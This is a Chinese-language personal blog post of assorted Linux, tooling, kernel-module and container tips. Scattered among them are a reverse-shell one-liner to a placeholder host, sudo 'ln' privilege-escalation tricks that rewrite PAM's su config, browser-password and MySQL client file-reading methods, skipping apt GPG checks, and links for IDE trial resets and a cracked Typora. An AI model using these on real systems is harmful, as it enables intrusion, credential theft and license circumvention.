---
title: Some Tricks
layout: post
categories: tool
tags: tool trick
date: 2021-10-13 18:00
excerpt: Some Tricks
---

{:.table-of-content}
* TOC
{:toc}

# 工具

## Linux二进制程序打包
> linuxdploy 文档：<https://docs.appimage.org/packaging-guide/from-source/linuxdeploy-user-guide.html>

- 下载
	- [linuxdeploy](https://github.com/linuxdeploy/linuxdeploy/releases/download/continuous/linuxdeploy-x86_64.AppImage)
	- [appimage](https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImage)
	- [appicon](https://github.com/linuxdeploy/linuxdeploy/blob/master/resources/linuxdeploy.png)
	- [appdesktop](https://github.com/linuxdeploy/linuxdeploy/blob/master/resources/linuxdeploy.desktop)

- 打包
假设要打包test程序
```bash
linuxdeploy-x86_64 --appdir appdir_test -e test -d linuxdeploy.desktop -i linuxdeploy.png
ln -s appdir_test/test appdir_test/AppRun or echo "#!/bin/bash\nexec $APPDIR/test $@"
appimagetool-x86_64.AppImage appdir_test test.appimage
```

- 运行
```bash
./test.appimage
# 如果没有fuse的话
./test.appimage --appimage-extract-and-run
```

## python打包与反编译

[python打包与反编译](https://saucer-man.com/information_security/825.html)

## 使用bash实现curl下载功能
```shell
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
# 保存上述函数到curl.sh
. curl.sh
# 下载
__curl http://www.google.com/favicon.ico > mine.ico
```

## 视频下载转换剪辑
> 使用yt-dlp替代youtube-dl，下载速度会有很大提升
> 使用[lux](https://github.com/iawia002/lux)替代you-get

- 下载视频列表
```shell
# 例
yt-dlp --proxy 127.0.0.1:1080 --yes-playlist --embed-subs -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio' --merge-output-format mp4 "https://www.youtube.com/watch?v=fNxaJsNG3-s&list=PLQY2H8rRoyvzDbLUZkbudP-MFQZwNmU4S"
```

- 下载视频列表的字幕
```shell
# 例
yt-dlp --proxy 127.0.0.1:1080 --sub-lang en --write-auto-sub --sub-format srt --skip-download --yes-playlist "https://www.youtube.com/watch?v=fNxaJsNG3-s&list=PLQY2H8rRoyvzDbLUZkbudP-MFQZwNmU4S"
```

- 失败重试
```shell
do { yt-dlp --proxy 127.0.0.1:1081 --socket-timeout 10 --yes-playlist --embed-subs -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio' --merge-output-format mp4 --sub-lang en --write-auto-sub https://www.youtube.com/playlist?list=PLLHTzKZzVU9eaEyErdV26ikyolxOsz6mq } while(! $?)
```

- Axiom集成了ffmpeg和youtube-dl并提供了UI界面，可用它方便的下载转换剪辑视频
  - 下载Axiom: https://github.com/MattMcManis/Axiom/releases
  - 解压
  - 下载yt-dlp.exe: https://github.com/yt-dlp/yt-dlp/releases
  - 用yt-dlp替换Axiom的youtube-dl

## Github Desktop配置代理
配置文件在`C:\users\<username>\.gitconfig`
```
[http]
    proxy = http://127.0.0.1:1080
[https]
    proxy = http://127.0.0.1:1080
[git]
    proxy = http://127.0.0.1:1080
```

## 使用bash实现netstat功能
```shell
#!/bin/bash
convert_ipv4()
{
local_ip=`echo $3 | awk '{split($0,a,":");gsub("[A-F0-9][A-F0-9]"," 0x&",a[1]);n=split(a[1],ip);for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d:",strtonum(ip[i]));sub("[A-F0-9]+","0x&",a[2]);printf("%d",strtonum(a[2]));}'`
remote_ip=`echo $4 | awk '{split($0,a,":");gsub("[A-F0-9][A-F0-9]"," 0x&",a[1]);n=split(a[1],ip);for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d:",strtonum(ip[i]));sub("[A-F0-9]+","0x&",a[2]);if(strtonum(a[2]) == 0) printf("*\n");else printf("%d\n",strtonum(a[2]));}'`
if [ $1 == "udp" ];then case $5 in 01)state="ESTABLISHED";;*)state="-";;esac;else
case $5 in
01)state="ESTABLISHED"
;;
02)state="SYN_SENT"
;;
03)state="SYN_RECV"
;;
04)state="FIN_WAIT1"
;;
05)state="FIN_WAIT2"
;;
06)state="TIME_WAIT"
;;
07)state="CLOSE"
;;
08)state="CLOSE_WAIT"
;;
09)state="LAST_ACK"
;;
0A)state="LISTEN"
;;
0B)state="CLOSING"
;;
*)state="UNKNOW"
;;
esac
fi
dirs=`find /proc/ -maxdepth 1 -type d`
find=`for dir in $dirs;do if [ -d $dir/fd ] && ls $dir/fd -l | grep ${11};then echo $dir;break;fi;done`
pid=${find##*/}
find=`ls /proc/$pid/exe -l 2>/dev/null`
cmd=${find##*/}
if [ -z $pid ];then echo "$1 $local_ip $remote_ip $state -" | awk '{printf("%-30s%-30s%-30s%-30s%-30s\n",$1,$2,$3,$4,$5)}';else
echo "$1 $local_ip $remote_ip $state $pid/$cmd" | awk '{printf("%-30s%-30s%-30s%-30s%-30s\n",$1,$2,$3,$4,$5)}';fi
}
convert_ipv6()
{
local_ip=`echo $3 | awk '{split($0,a,":");b=substr(a[1],25,8);gsub("[A-F0-9][A-F0-9]"," 0x&",b);n=split(b,ip);if(ip[1] ~/01/) {printf("%s:","127.0.0.1");sub("[A-F0-9]+","0x&",a[2]);printf("%d\n",strtonum(a[2]));} else {for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d:",strtonum(ip[i]));sub("[A-F0-9]+","0x&",a[2]);printf("%d\n",strtonum(a[2]));}}'`
remote_ip=`echo $4 | awk '{split($0,a,":");b=substr(a[1],25,8);gsub("[A-F0-9][A-F0-9]"," 0x&",b);n=split(b,ip);if(ip[1] ~/01/) {printf("%s:","127.0.0.1");sub("[A-F0-9]+","0x&",a[2]);printf("%d\n",strtonum(a[2]));} else {for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d:",strtonum(ip[i]));sub("[A-F0-9]+","0x&",a[2]);if(strtonum(a[2]) == 0) printf("*\n");else printf("%d\n",strtonum(a[2]));}}'`
if [ $1 == "udp" ];then case $5 in 01)state="ESTABLISHED";;*)state="-";;esac;else
case $5 in
01)state="ESTABLISHED"
;;
02)state="SYN_SENT"
;;
03)state="SYN_RECV"
;;
04)state="FIN_WAIT1"
;;
05)state="FIN_WAIT2"
;;
06)state="TIME_WAIT"
;;
07)state="CLOSE"
;;
08)state="CLOSE_WAIT"
;;
09)state="LAST_ACK"
;;
0A)state="LISTEN"
;;
0B)state="CLOSING"
;;
*)state="UNKNOW"
;;
esac
fi
dirs=`find /proc/ -maxdepth 1 -type d`
find=`for dir in $dirs;do if [ -d $dir/fd ] && ls $dir/fd -l | grep ${11};then echo $dir;break;fi;done`
pid=${find##*/}
find=`ls /proc/$pid/exe -l 2>/dev/null`
cmd=${find##*/}
if [ -z $pid ];then echo "$1 $local_ip $remote_ip $state -" | awk '{printf("%-30s%-30s%-30s%-30s%-30s\n",$1,$2,$3,$4,$5)}';else
echo "$1 $local_ip $remote_ip $state $pid/$cmd" | awk '{printf("%-30s%-30s%-30s%-30s%-30s\n",$1,$2,$3,$4,$5)}';fi
}
convert_route()
{
iface=$1
dest=`echo $2 | awk '{b=$0;gsub("[A-F0-9][A-F0-9]"," 0x&",b);n=split(b,ip);for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d",strtonum(ip[i]));}'`
gateway=`echo $3 | awk '{b=$0;gsub("[A-F0-9][A-F0-9]"," 0x&",b);n=split(b,ip);for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d",strtonum(ip[i]));}'`
flags=`echo $4 | awk '{printf("%d",strtonum($0));}'`
mask=`echo $8 | awk '{b=$0;gsub("[A-F0-9][A-F0-9]"," 0x&",b);n=split(b,ip);for(i=n;i>1;i--) printf("%d.",strtonum(ip[i]));printf("%d",strtonum(ip[i]));}'`
case $flags in
1)state='U'
;;
3)state='UG'
;;
*)state=$flags
;;
esac
if [ $gateway == "0.0.0.0" ];then gateway='*';fi
case $dest in
"169.254.0.0")dest='link-local'
;;
"127.0.0.0")dest='loopback'
;;
"0.0.0.0")dest='default'
;;
*)
;;
esac
awk 'BEGIN {printf("%-30s%-30s%-30s%-30s%-30s\n","'$dest'","'$gateway'","'$mask'","'$state'","'$iface'");}'
}
print_tcp()
{
if [ -f /proc/net/tcp ];then cat /proc/net/tcp | while read line;do case $line in sl*);;*)convert_ipv4 tcp $line;;esac;done;fi
if [ -f /proc/net/tcp6 ];then cat /proc/net/tcp6 | while read line;do case $line in sl*);;*)convert_ipv6 tcp $line;;esac;done;fi
}
print_udp()
{
if [ -f /proc/net/udp ];then cat /proc/net/udp | while read line;do case $line in sl*);;*)convert_ipv4 udp $line;;esac;done;fi
if [ -f /proc/net/udp6 ];then cat /proc/net/udp6 | while read line;do case $line in sl*);;*)convert_ipv6 udp $line;;esac;done;fi
}
print_title()
{
echo "begin" | awk '{printf("%-30s%-30s%-30s%-30s%-30s\n","protocol","local_address","remote_address","state","process")}'
}
print_title_route()
{
echo "ROUTE"
awk 'BEGIN {printf("%-30s%-30s%-30s%-30s%-30s\n","Destination","Gateway","Genmask","Flags","Iface");}'
print_route
echo -e "\nARP"
if [ -f /proc/net/arp ];then cat /proc/net/arp;fi
}
print_route()
{
if [ -f /proc/net/route ];then cat /proc/net/route | while read line;do case $line in I*);;*)convert_route $line;;esac;done;fi
}
print_help()
{
echo "usage:"
echo " `basename $0` -[a(all) p(protocol like tcp,udp) r(route) h(help)]"
}
while getopts arhp: option
do
case $option in
a) print_title;print_tcp;print_udp
;;
r) print_title_route
;;
h) print_help
;;
p) case $OPTARG in tcp)print_title;print_tcp;;udp)print_title;print_udp;;*)echo "[-p] protocol should be tcp|udp";;esac
;;
*) print_help
;;
esac
done
if [ $# -eq 0 ];then print_help;fi
```

## 查看所有namespace下的连接
```
REL: https://unix.stackexchange.com/questions/203723/how-can-i-list-all-connections-to-my-host-including-those-to-lxc-guests
find /proc/ 2>/dev/null | grep tcp | grep -v task | grep -v sys/net | xargs grep -v rem_address 2>/dev/null | awk '{x=strtonum("0x"substr($3,index($3,":")-2,2)); y=strtonum("0x"substr($4,index($4,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2)); for (i=5; i>0; i-=2) y = y"."strtonum("0x"substr($4,i,2))}{printf ("%s\t:%s\t ----> \t %s\t:%s\t%s\n",x,strtonum("0x"substr($3,index($3,":")+1,4)),y,strtonum("0x"substr($4,index($4,":")+1,4)),$1)}' | sort | uniq --check-chars=25
```

## Source Insight4添加自定义parser

- 例1：标记未识别的结构<br>
	1. 初始分析后未识别`QXLRam`结构<br>
	![](/assets/img/si4_parsing1.png)
	2. 打开`File Type Options`，点击`Language`<br>
	![](/assets/img/si4_parsing2.png)
	3. 点击`Properties`<br>
	![](/assets/img/si4_parsing3.png)
	4. 开启正则解析，添加解析规则，匹配`\(.*\)`中的内容为指定类型的`symbol`，在`Source Insight`正则表达式中，`\w`表示空格，也可选择`perl`类型的正则<br>
	![](/assets/img/si4_parsing4.png)
	5. 重新解析后，识别出`QXLRam`结构<br>

## tmux

- 会话
	- 创建新会话，直接`tmux`或者指定会话名称`tmux new -s xxx`
	- 退出会话`ctrl b + d` (ctrl b松开再按d，以下同理)
	- 重连会话，直接`tmux a`进入第一个会话，或者`tmux a -t xxx`进入xxx会话
	- 列出所有会话`tmux ls`
- 窗口
	- 复制模式`ctrl b + [`，在复制模式中可以上下翻页，可以搜索`ctrl + s`，按`q`退出
	- 粘贴复制模式中复制的文本`ctrl b + ]`
	- 新建窗口`ctrl b + c`
	- 关闭当前窗口`ctrl b + &`
	- 切换窗口，到指定窗口`ctrl b + 0~9`，到上一窗口`ctrl b + p`，到下一窗口`ctrl b + n`
	- 打开窗口列表`ctrl b + w`
- 面板
	- 上下分屏`ctrl b + "`
	- 左右分屏`ctrl b + %`
	- 关闭当前面板`ctrl b + x`
	- 把当前面板移动到新窗口`ctrl b + !`
	- 方向键切换面板`ctrl b + 上下左右`
- 参考
	- <http://louiszhai.github.io/2017/09/30/tmux/>

## IDEA 无限续期
> 参考：https://zhile.io/<br>
> ide-eval-resetter针对2021.2.2以下版本适用，最新版https://plugins.zhile.io/files/ide-eval-resetter-2.3.5-c80a1d.zip<br>
> IDEA java：https://download-cdn.jetbrains.com/idea/ideaIU-2021.1.3.exe<br>
> IDEA go：https://download-cdn.jetbrains.com/go/goland-2021.1.3.exe<br>

- 下载IDEA、安装、启动，选择30天试用
- 安装`IDEA Eval Reset`插件
	- 进入`File->Settings`，选中`Plugins`<br>
	![](/assets/img/idea1.png)
	- 添加自定义仓库`https://plugins.zhile.io`<br>
	![](/assets/img/idea2.png)
	- 在`Marketplace`里搜索`idea eval`安装<br>
	![](/assets/img/idea3.png)
- 安装后会在`help`菜单最后增加`Eval Reset`，点击之后在下方勾选`Auto Reset`即可

## apt 忽略GPG校验
- apt-get --allow-unauthenticated update
- 修改sources.list，在deb后面增加一个标识，`deb [trusted=yes]`

## 读取浏览器数据，解密密码
[HackBrowserData](https://github.com/moonD4rk/HackBrowserData)

## 利用`ln`提权
### 利用`ln -t`
如果sudo配置里面只允许创建符号链接`ln -sf * A`，由于中间有通配，可使用`-t`忽略链接名称A，并覆盖任意文件，从而提权
```shell
ln -sf /tmp/ln -t /bin aaaaaa
ls /bin/ln -l
lrwxrwxrwx 1 root root 7 Mar 21 09:06 /bin/ln -> /tmp/ln
```
### 利用`ln -S`
```shell
cp /etc/pam.d/su /tmp
sed -i 's/auth.*/auth sufficient pam_permit.so/' /tmp/su
ln -s /usr/local/xxx/ /tmp/su /etc/pam.d -S xxx
ls /etc/pam.d/ -l
lrwxrwxrwx 1 root root    7 Jun 25 17:25 su -> /tmp/su
lrwxrwxrwx 1 root root   15 Jun 25 17:25 xxx -> /usr/local/xxx/
```

## 利用网络命名空间抓取指定进程流量
[nsntrace](https://github.com/nsntrace/nsntrace)

## 跨平台、开源录屏软件
[OBS Studio](https://obsproject.com/)

## csv to markdown table
[csvtomd](https://github.com/mplewis/csvtomd)
```
pip3 install csvtomd
csvtomd [csv_file]
```

## win下文本搜索工具，支持压缩文件及各种文档
[dngrep](https://dngrep.github.io/)

## gdb使用技巧
> online-doc: https://sourceware.org/gdb/onlinedocs/gdb/

- [layout快捷键](https://sourceware.org/gdb/onlinedocs/gdb/TUI-Keys.html#TUI-Keys)、[layout命令](https://sourceware.org/gdb/onlinedocs/gdb/TUI-Commands.html#TUI-Commands)、`winheight name +/-count`增大减小窗口大小
- [print设置](https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html#Print-Settings)、`set print pretty on`缩进显示结构、`set print demangle on`显示c++原始结构名
- 禁用线程切换`set scheduler-locking on`
- 查找函数符号`info functions XXX`
- [显示源码](https://sourceware.org/gdb/onlinedocs/gdb/List.html#List)，设置显示行数`set listsize count`

## systemd日志查看
- 查找units，`systemctl list-units cron*`
- 显示unit日志，`journalctl -xefu cron`(`x[catalog], e[end], f[follow], u[unit]`)

## 在线图片编辑工具
- [AI放大](https://www.upscale.media)
- [图片编辑转换](https://www.img2go.com/zh)
- [Gif压缩](https://docsmall.com/gif-compress)

## 下载archive.org上保存的网站

[wayback-machine-downloader](https://github.com/hartator/wayback-machine-downloader)
```shell
# 由于下载下来的网页中引用的资源都是网站的url，无法离线访问，需要对url做替换
# 假设下载网站为http://www.test.com
gem install wayback_machine_downloader
wayback_machine_downloader http://www.test.com -c 4
# 替换test.com为本地链接
cd websites/www.test.com
find . -maxdepth 1 -mindepth 1 -name "*.html" -exec sed -i 's/http:\/\/www.test.com/./g' {} \; # 替换第一层
find . -maxdepth 2 -mindepth 2 -name "*.html" -exec sed -i 's/http:\/\/www.test.com/../g' {} \; # 替换第二层
# 以此类推
# 如果引用了其他子域名，比如a.test.com
cd ../..
wayback_machine_downloader http://www.a.test.com -c 4
mv websites/www.a.test.com websites/www.test.com/a.test
cd websites/www.test.com
find . -maxdepth 1 -mindepth 1 -name "*.html" -exec sed -i 's/http:\/\/www.a.test.com/.\/a.test/g' {} \; # 替换第一层
find . -maxdepth 1 -mindepth 1 -name "*.html" -exec sed -i 's/http:\/\/www.a.test.com/..\/a.test/g' {} \; # 替换第一层
# 以此类推
```

## typora windows破解版
<https://www.fahai.org/index.php/archives/166/>
<https://github.com/shuhongfan/TyporaCrack>

## 反弹shell显示优化
- 服务端监听`nc -lv 8888`
- 客户端反弹`bash -i >& /dev/tcp/x.x.x.x/8888 0>&1`
- 服务端执行`ctrl+z`把`nc`放进后台
- 服务端执行`stty raw -echo`
- 服务端执行`fg + [Enter x 2]`
- 服务端执行`script /dev/null && exit`
- 服务端执行`reset`

## git删除历史文件
> https://www.cnblogs.com/rptgba/articles/7156074.html

```bash
git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch ${filename}' --prune-empty --tag-name-filter cat -- --all
git push --all --force
```

## chrome允许访问显示证书错误的网站
在网页空白处输入`thisisunsafe`即可

## mysql客户端读取本地文件
- [使用伪造的server，在客户端连接时读取](https://github.com/rmb122/rogue_mysql_server)
- 使用正常的mysql server，先创建表`create table test(data blob)`，然后执行`load data local infile "file:///etc/passwd" into test`读取文件，`load data local infile "file:///" into test`读取目录，此时须注意客户端连接到的数据库要是test表所在的数据库，如`{ip}:{port}/{dbname}`

## 文本绘制流程图
<https://asciiflow.com/#/>

## 使powershell和cmd支持ansi颜色
下载[ansicon](https://github.com/adoxa/ansicon/releases/download/v1.89/ansi189-bin.zip)，解压运行`ansicon.exe`后即可

## 完整保存网页到单独的html文件
> https://github.com/gildas-lormeau/SingleFile

- chrome: https://chrome.google.com/extensions/detail/mpiodijhokgodhhofbcjdecpffjipkle
- edge: https://microsoftedge.microsoft.com/addons/detail/efnbkdcfmcmnhlkaijjjmhjjgladedno

## 将网页保存为pdf的命令行工具
> https://github.com/wkhtmltopdf/wkhtmltopdf

```
#download from https://wkhtmltopdf.org/downloads.html
wkhtmltopdf http://google.com google.pdf
```

# 系统

## 编写独立内核模块
> `struct module`结构保存在`.gnu.linkonce.this_module`段中，模块名称和内核版本保存在`.modinfo`段中<br>
> 参考：<https://itnext.io/a-standalone-linux-kernel-module-df54283d4803>

- 找出init和exit函数在`struct module`中的偏移
code:
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
static int __init lkm_example_init(void) {
    //struct module *mod = THIS_MODULE;
    printk(KERN_INFO "0x%lx 0x%lx 0x%lx\n", sizeof(struct module), offsetof(struct module, init), offsetof(struct module, exit));
    printk(KERN_INFO "Hello, World!\n");
    return 0;
}
static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");
}
module_init(lkm_example_init);
module_exit(lkm_example_exit);
```
Makefile:
```makefile
obj-m += example.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
```shell
insmod example.ko
dmesg | tail
```
得到`struct module`的大小为0x340，init的偏移为0x178，exit的偏移为0x308

- 找到printk的函数地址
```shell
cat /proc/kallsyms | grep -E "\bprintk$"
```
得到printk函数的地址为`ffffffff966f4270`

- 编写独立内核模块代码`test_mod.c`
```c
#define NAME "standalone"
#define VERMAGIC "4.15.0-135-generic SMP mod_unload "
__attribute__((section(".modinfo")))
char modinfo_strings[] =
"name=" NAME "\0"
"vermagic=" VERMAGIC;
#define KERN_SOH    "\001"      /* ASCII Start Of Header */
#define KERN_SOH_ASCII  '\001'
#define KERN_EMERG  KERN_SOH "0"    /* system is unusable */
#define KERN_ALERT  KERN_SOH "1"    /* action must be taken immediately */
#define KERN_CRIT   KERN_SOH "2"    /* critical conditions */
#define KERN_ERR    KERN_SOH "3"    /* error conditions */
#define KERN_WARNING    KERN_SOH "4"    /* warning conditions */
#define KERN_NOTICE KERN_SOH "5"    /* normal but significant condition */
#define KERN_INFO   KERN_SOH "6"    /* informational */
#define KERN_DEBUG  KERN_SOH "7"    /* debug-level messages */
int (*printk)(const char *fmt, ...) = 0xffffffff966f4270;
int my_init(void) {
    printk(KERN_INFO "Hello, World!\n");
    return 0;
}
void my_exit(void) {
    printk(KERN_INFO "Bye Bye!\n");
}
__attribute__((section(".gnu.linkonce.this_module")))
struct module {
    char __pad0[0x18];
    char name[sizeof(NAME)];
    char __pad1[0x178 - 0x18 - sizeof(NAME)];
    void *init;
    char __pad2[0x308 - 0x178 - sizeof(void*)];
    void *exit;
    char __pad3[0x340 - 0x308 - sizeof(void*)];
} __attribute__((packed))
__this_module = {
    .name = NAME,
    .init = my_init,
    .exit = my_exit,
};
```

- 编译`test_mod.c`
```shell
gcc -c test_mod.c -o test_mod.ko
```

- 插入模块
```shell
insmod test_mod.ko
dmesg | tail
lsmod | grep standalone
rmmod standalone
```

## 修改内核模块版本号
> 可直接使用https://github.com/yaxinsn/vermagic修改
> `vermagic`不可短改长，可以长改短，修改`/lib/modules/$(uname -r)/build/include/linux/vermagic.h`中的VERMAGIC_STRING，预留些空格，以防目标机器的`vermagic`过长

- 查看本机`vermagic`
```shell
modinfo $(lsmod | awk '{print $1}' | tail -1) | grep vermagic
```

- 查看`example.ko`模块的版本信息
```shell
objdump -sj .modinfo example.ko
example.ko:     file format elf64-x86-64
Contents of section .modinfo:
 0000 73726376 65727369 6f6e3d38 44374543  srcversion=8D7EC
 0010 38373342 34323930 39373931 34374338  873B4290979147C8
 0020 45440000 00000000 64657065 6e64733d  ED......depends=
 0030 00726574 706f6c69 6e653d59 006e616d  .retpoline=Y.nam
 0040 653d6578 616d706c 65007665 726d6167  e=example.vermag
 0050 69633d34 2e31352e 302d3133 352d6765  ic=4.15.0-135-ge
 0060 6e657269 6320534d 50206d6f 645f756e  neric SMP mod_un
 0070 6c6f6164 2000                        load .
```

- 保存.modinfo内容到文件
```shell
objcopy -O binary --only-section=.modinfo example.ko modinfo
```

- 使用vim编辑modinfo文件，修改版本号，在编辑时需要设置`:set bin`，否则在保存的时候会在行尾追加换行符
- 更新modinfo
```shell
objcopy --update-section .modinfo=modinfo example.ko
objdump -sj .modinfo example.ko
example.ko:     file format elf64-x86-64
Contents of section .modinfo:
 0000 73726376 65727369 6f6e3d38 44374543  srcversion=8D7EC
 0010 38373342 34323930 39373931 34374338  873B4290979147C8
 0020 45440000 00000000 64657065 6e64733d  ED......depends=
 0030 00726574 706f6c69 6e653d59 006e616d  .retpoline=Y.nam
 0040 653d6578 616d706c 65007665 726d6167  e=example.vermag
 0050 69633d33 2e31352e 302d3133 352d6765  ic=3.15.0-135-ge
 0060 6e657269 6320534d 50206d6f 645f756e  neric SMP mod_un
 0070 6c6f6164 2000                        load .
```

## 识别PCI设备

- 通过lspci找到要查看的设备
```shell
lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Cirrus Logic GD 5446
```

- 查看厂商号和设备号
```shell
lspci -s -n 00:02.0
00:02.0 0300: 1013:00b8
#1013为厂商号，00b8为设备号
```

- 使用厂商号和设备号去网站查询<http://pci-ids.ucw.cz/mods/PC/1013/00b8>

## 编译发行版安装包

- yum/dnf
```shell
pkg=xxx
pkg_ver=`rpm -qa | grep $pkg`
yumdownloader --source $pkg or dnf download --source $pkg
yum-builddep $pkg or dnf builddep $pkg
rpm -i xxx
cd rpmbuild;rpmbuild -bb SPECS/xxx.spec
```

- apt
```shell
pkg=xxx
pkg_ver=`dpkg -l | grep $pkg`
apt-get source $pkg
tar xf xxx.orig.tar.xz
tar xf xxx.debian.tar.xz
apt build-dep $pkg
#debian目录下:
#changelog记录的版本更迭信息，包括修复的CVE
#control记录了依赖信息
#rules为编译脚本
mv debian xxx/
cd xxx;dpkg-buildpackage -rfakeroot -b -uc -us or debuild -b -uc -us
```

## 追踪库函数调用
程序在运行的时候会调用动态链接库中的函数，可使用`nm -D [target]`查看程序调用的库函数或库函数的导出函数
### gdb
```python
#!/usr/bin/env python3
import gdb
import re

breakpoints = []
gdb.execute('rbreak', to_string=True)
gdb.execute('run', to_string=True)
try:
    while True:
        a = gdb.execute('continue', to_string=True)
        reg = gdb.execute('info registers rip', to_string=True)
        b = reg.split()[1][2:]
        f = reg.split()[3]
        c = gdb.execute('info breakpoints', to_string=True).split('\n')
        d = [s for s in c if b in s]
        if len(d) > 1:
            sys.exit(1)
        e = d[0].split()[0].split('.')[0]
        gdb.execute('disable breakpoints ' + e)
        breakpoints.append(f)
except:
    f = open("output", "w+")
    [f.write(b + '\n') for b in breakpoints]
    f.close()
```
保存上述脚本为trace.py，使用gdb打开目标程序，执行`source trace.py`，之后会在当前目录下生成output，每个函数只记录一次，不会重复记录相同函数的多次调用

### uftrace
[文档](https://uftrace.github.io/slide/)
[代码](https://github.com/namhyung/uftrace)
如果编译的时候添加了-pg，可直接使用`uftrace [target]`，否则就用`uftrace -P . [target]`
- `-k`: 追踪内核函数调用，`-K 2`: 只显示两层
- `-A func@arg`: 打印函数参数，如`-A strrchr@arg1/s`，不加`/s`则显示地址，加了就会显示地址所指向的字符串，可同时添加多个`-A`，如`-A strrchr@arg1/s -A strrchr@arg2`
- `-R func`: 打印函数返回值，如跟踪程序获取环境变量`uftrace -P . -R getenv -A getenv@arg1/s [target]`

## 监控进程网络流量
安装bpftrace镜像`docker run -tdi -v /usr/src:/usr/src:ro -v /lib/modules/:/lib/modules:ro -v /sys/kernel/debug/:/sys/kernel/debug:rw --net=host --pid=host --privileged quay.io/iovisor/bpftrace:latest`
[监控进程网络流量](https://www.gcardone.net/2020-07-31-per-process-bandwidth-monitoring-on-Linux-with-bpftrace/)

## 各版本内核源码
[内核源码](https://elixir.bootlin.com/linux/latest/source)

# 容器

## 不使用docker进入正在运行的容器
```shell
PID=`docker inspect --format {{.State.Pid}} <container_name_or_ID>`
nsenter --target $PID --mount --uts --ipc --net --pid
```

## 直接挂载docker镜像
> 仅支持overlayFS，可使用`docker info | grep "Storage Driver"`来查看，例如`Storage Driver: overlay2`<br>
> 原理参考：<https://docs.docker.com/storage/storagedriver/overlayfs-driver/#how-the-overlay2-driver-works>

- 获取容器镜像信息
```shell
docker image inspect --format {{.GraphDriver.Data}} [repo:tag]
map[LowerDir:/var/lib/docker/overlay2/0f1a95dcb730433fdf39479ae9432324f5d3fca511d048508293fb63a1c0d16c/diff:/var/lib/docker/overlay2/5dbb92d967da7c64af8b2deb40097ff9ed52035a6a80365f62c6e797b44a4ea9/diff:/var/lib/docker/overlay2/284bbc04dc3335d8d75cc15925e1a51ecf210233b5764227f724d0976fd5519b/diff:/var/lib/docker/overlay2/25b50be9ef6d49113adde05f128eae042d30f5273777e3e5702c5f455e086654/diff:/var/lib/docker/overlay2/3658c1afed9ac524ffe138a650010a59df786b68516131fb1d774f351f62b893/diff:/var/lib/docker/overlay2/fb359a756d79c757e151cc3a65f350eb4188dc6c5ff2597b98e89c7319002cb7/diff MergedDir:/var/lib/docker/overlay2/0526a9a9950160c12f0c493b345962c03fe1f05f1023f5692aa2ad7e8b36e15b/merged UpperDir:/var/lib/docker/overlay2/0526a9a9950160c12f0c493b345962c03fe1f05f1023f5692aa2ad7e8b36e15b/diff WorkDir:/var/lib/docker/overlay2/0526a9a9950160c12f0c493b345962c03fe1f05f1023f5692aa2ad7e8b36e15b/work]
```

- 合并lowerdir、upperdir并挂载到/mnt目录下，workdir为缓存
```shell
mount -t overlay overlay -o lowerdir=/var/lib/docker/overlay2/0f1a95dcb730433fdf39479ae9432324f5d3fca511d048508293fb63a1c0d16c/diff:/var/lib/docker/overlay2/5dbb92d967da7c64af8b2deb40097ff9ed52035a6a80365f62c6e797b44a4ea9/diff:/var/lib/docker/overlay2/284bbc04dc3335d8d75cc15925e1a51ecf210233b5764227f724d0976fd5519b/diff:/var/lib/docker/overlay2/25b50be9ef6d49113adde05f128eae042d30f5273777e3e5702c5f455e086654/diff:/var/lib/docker/overlay2/3658c1afed9ac524ffe138a650010a59df786b68516131fb1d774f351f62b893/diff:/var/lib/docker/overlay2/fb359a756d79c757e151cc3a65f350eb4188dc6c5ff2597b98e89c7319002cb7/diff,upperdir=/var/lib/docker/overlay2/0526a9a9950160c12f0c493b345962c03fe1f05f1023f5692aa2ad7e8b36e15b/diff,workdir=/var/lib/docker/overlay2/0526a9a9950160c12f0c493b345962c03fe1f05f1023f5692aa2ad7e8b36e15b/work /mnt/
```
- 统一起来
```
image = [repo:tag]
lowerdir=`docker image inspect --format {{.GraphDriver.Data}} $image | awk -F 'LowerDir:' '{split($2,s," ");print s[1]}'`
upperdir=`docker image inspect --format {{.GraphDriver.Data}} $image | awk -F 'UpperDir:' '{split($2,s," ");print s[1]}'`
workdir=`docker image inspect --format {{.GraphDriver.Data}} $image | awk -F ']' '{print $1}' |awk -F 'WorkDir:' '{split($2,s," ");print s[1]}'`
mount -t overlay overlay -o lowerdir=$lowerdir,upperdir=$upperdir,workdir=$workdir /mnt
```

# 网站

- <https://data.stats.gov.cn> (国家数据)
- <https://apps.evozi.com/apk-downloader/>  (从google play上下载apk)
